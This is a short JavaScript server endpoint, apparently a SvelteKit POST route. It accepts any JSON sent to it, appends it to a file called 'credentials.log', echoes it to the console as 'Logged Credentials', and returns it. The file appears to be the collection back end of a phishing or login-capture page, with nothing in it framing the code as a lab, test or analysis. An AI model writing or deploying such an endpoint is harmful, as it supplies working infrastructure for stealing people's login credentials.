import fs from "fs/promises";

export async function POST(event) {
  const data = await event.request.json();

  try {
    await fs.appendFile("credentials.log", JSON.stringify(data) + "\n");
  } catch (error) {
    console.error("Failed to Log Credentials:", error);
  }

  console.log("Logged Credentials:", data);

  return data;
}